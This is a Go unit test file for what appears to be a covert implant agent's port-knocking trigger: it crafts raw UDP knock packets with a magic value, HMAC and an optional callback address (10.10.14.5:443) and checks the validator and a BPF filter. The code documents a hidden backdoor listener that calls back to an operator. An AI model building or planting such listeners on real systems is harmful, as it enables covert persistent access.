//go:build agent

package agent

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"testing"
)

// buildTestPacket constructs a raw IP+UDP packet with the given knock payload.
func buildTestPacket(dstPort uint16, payload []byte) []byte {
	// IP header (20 bytes, minimal).
	ip := make([]byte, 20)
	ip[0] = 0x45       // Version 4, IHL 5 (20 bytes)
	ip[9] = 17         // Protocol: UDP
	totalLen := 20 + 8 + len(payload)
	binary.BigEndian.PutUint16(ip[2:4], uint16(totalLen))

	// UDP header (8 bytes).
	udp := make([]byte, 8)
	binary.BigEndian.PutUint16(udp[0:2], 12345) // src port
	binary.BigEndian.PutUint16(udp[2:4], dstPort)
	binary.BigEndian.PutUint16(udp[4:6], uint16(8+len(payload)))
	// checksum left as 0

	pkt := append(ip, udp...)
	pkt = append(pkt, payload...)
	return pkt
}

// buildKnockPayload constructs a valid knock payload with the given PSK.
func buildKnockPayload(psk []byte, callback []byte) []byte {
	payload := make([]byte, 4+8+12+len(callback))

	// Magic.
	binary.BigEndian.PutUint32(payload[0:4], knockMagic)

	// Nonce.
	nonce := payload[4:12]
	if _, err := rand.Read(nonce); err != nil {
		panic(err)
	}

	// HMAC.
	mac := hmac.New(sha256.New, psk)
	mac.Write(nonce)
	copy(payload[12:24], mac.Sum(nil)[:hmacTruncLen])

	// Optional callback.
	if len(callback) > 0 {
		copy(payload[24:], callback)
	}

	return payload
}

func TestIsValidKnock_Valid(t *testing.T) {
	psk := []byte("test-secret-key-1234")
	port := uint16(49152)

	payload := buildKnockPayload(psk, nil)
	pkt := buildTestPacket(port, payload)

	addr, ok := isValidKnock(pkt, port, psk)
	if !ok {
		t.Fatal("expected valid knock, got invalid")
	}
	if addr != "" {
		t.Fatalf("expected empty callback addr, got %q", addr)
	}
}

func TestIsValidKnock_WithCallback(t *testing.T) {
	psk := []byte("test-secret-key-1234")
	port := uint16(49152)

	// Callback: 10.10.14.5:443
	callback := []byte{10, 10, 14, 5, 0x01, 0xBB} // 0x01BB = 443
	payload := buildKnockPayload(psk, callback)
	pkt := buildTestPacket(port, payload)

	addr, ok := isValidKnock(pkt, port, psk)
	if !ok {
		t.Fatal("expected valid knock, got invalid")
	}
	if addr != "10.10.14.5:443" {
		t.Fatalf("expected callback addr 10.10.14.5:443, got %q", addr)
	}
}

func TestIsValidKnock_WrongPSK(t *testing.T) {
	psk := []byte("correct-key")
	wrongPSK := []byte("wrong-key")
	port := uint16(49152)

	payload := buildKnockPayload(wrongPSK, nil)
	pkt := buildTestPacket(port, payload)

	_, ok := isValidKnock(pkt, port, psk)
	if ok {
		t.Fatal("expected invalid knock with wrong PSK, got valid")
	}
}

func TestIsValidKnock_WrongPort(t *testing.T) {
	psk := []byte("test-key")
	port := uint16(49152)
	wrongPort := uint16(8080)

	payload := buildKnockPayload(psk, nil)
	pkt := buildTestPacket(wrongPort, payload)

	_, ok := isValidKnock(pkt, port, psk)
	if ok {
		t.Fatal("expected invalid knock with wrong port, got valid")
	}
}

func TestIsValidKnock_WrongMagic(t *testing.T) {
	psk := []byte("test-key")
	port := uint16(49152)

	payload := buildKnockPayload(psk, nil)
	// Corrupt the magic bytes.
	binary.BigEndian.PutUint32(payload[0:4], 0xDEADBEEF)
	pkt := buildTestPacket(port, payload)

	_, ok := isValidKnock(pkt, port, psk)
	if ok {
		t.Fatal("expected invalid knock with wrong magic, got valid")
	}
}

func TestIsValidKnock_TruncatedPacket(t *testing.T) {
	psk := []byte("test-key")
	port := uint16(49152)

	// Too short — only magic + partial nonce.
	payload := make([]byte, 10)
	binary.BigEndian.PutUint32(payload[0:4], knockMagic)
	pkt := buildTestPacket(port, payload)

	_, ok := isValidKnock(pkt, port, psk)
	if ok {
		t.Fatal("expected invalid knock with truncated payload, got valid")
	}
}

func TestIsValidKnock_CorruptedHMAC(t *testing.T) {
	psk := []byte("test-key")
	port := uint16(49152)

	payload := buildKnockPayload(psk, nil)
	// Flip a bit in the HMAC.
	payload[15] ^= 0xFF
	pkt := buildTestPacket(port, payload)

	_, ok := isValidKnock(pkt, port, psk)
	if ok {
		t.Fatal("expected invalid knock with corrupted HMAC, got valid")
	}
}

func TestIsValidKnock_NotUDP(t *testing.T) {
	psk := []byte("test-key")
	port := uint16(49152)

	payload := buildKnockPayload(psk, nil)
	pkt := buildTestPacket(port, payload)
	// Change protocol from UDP (17) to TCP (6).
	pkt[9] = 6

	_, ok := isValidKnock(pkt, port, psk)
	if ok {
		t.Fatal("expected invalid knock with TCP protocol, got valid")
	}
}

func TestIsValidKnock_TooShortIP(t *testing.T) {
	psk := []byte("test-key")
	port := uint16(49152)

	// Packet shorter than minimal IP header.
	pkt := make([]byte, 10)
	_, ok := isValidKnock(pkt, port, psk)
	if ok {
		t.Fatal("expected invalid with short packet, got valid")
	}
}

func TestIsValidKnock_CallbackZeroPort(t *testing.T) {
	psk := []byte("test-key")
	port := uint16(49152)

	// Callback with port 0 should be ignored.
	callback := []byte{10, 10, 14, 5, 0x00, 0x00}
	payload := buildKnockPayload(psk, callback)
	pkt := buildTestPacket(port, payload)

	addr, ok := isValidKnock(pkt, port, psk)
	if !ok {
		t.Fatal("expected valid knock, got invalid")
	}
	if addr != "" {
		t.Fatalf("expected empty callback addr for port 0, got %q", addr)
	}
}

func TestBuildBPFFilter(t *testing.T) {
	filter := buildBPFFilter(49152)
	if len(filter) != 10 {
		t.Fatalf("expected 10 BPF instructions, got %d", len(filter))
	}
	// The port should appear in the JEQ instruction (index 7).
	if filter[7].K != 49152 {
		t.Fatalf("expected port 49152 in BPF filter, got %d", filter[7].K)
	}
	// Instruction 8 must be RET accept (non-zero).
	if filter[8].K == 0 {
		t.Fatal("instruction 8 should be RET accept (non-zero), got RET 0")
	}
	// Instruction 9 must be RET reject (zero).
	if filter[9].K != 0 {
		t.Fatalf("instruction 9 should be RET reject (0), got %d", filter[9].K)
	}
	// Instruction 1: non-UDP should jump to reject (instruction 9), jf=7.
	if filter[1].Jf != 7 {
		t.Fatalf("instruction 1 jf should be 7 (jump to reject), got %d", filter[1].Jf)
	}
}
